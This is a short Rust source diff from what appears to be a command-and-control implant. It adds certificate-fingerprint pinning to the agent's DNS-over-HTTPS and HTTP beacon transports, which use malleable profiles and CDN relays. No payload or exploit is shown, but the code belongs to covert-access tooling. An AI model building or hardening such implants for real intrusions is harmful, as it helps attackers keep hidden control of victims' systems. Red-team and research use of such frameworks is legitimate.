@@ -247,7 +247,7 @@ pub async fn build_outbound_transport(
                     );
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
+                        crate::c2_doh::DohTransport::new(&cfg.malleable_profile, session, agent_id.to_string(), cfg.server_cert_fingerprint.clone())
                             .await
                             .map_err(|e| anyhow!("DohTransport init failed: {e}"))?,
                     ));
@@ -263,7 +263,7 @@ pub async fn build_outbound_transport(
                     info!("http-transport: cdn_relay=true; switching to HttpTransport");
                     let session = CryptoSession::from_shared_secret(secret.as_bytes());
                     return Ok(Box::new(
-                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session, agent_id.to_string())
+                        crate::c2_http::HttpTransport::new(&cfg.malleable_profile, session, agent_id.to_string(), cfg.server_cert_fingerprint.clone())
                             .await
                             .map_err(|e| anyhow!("HttpTransport init failed: {e}"))?,
                     ));
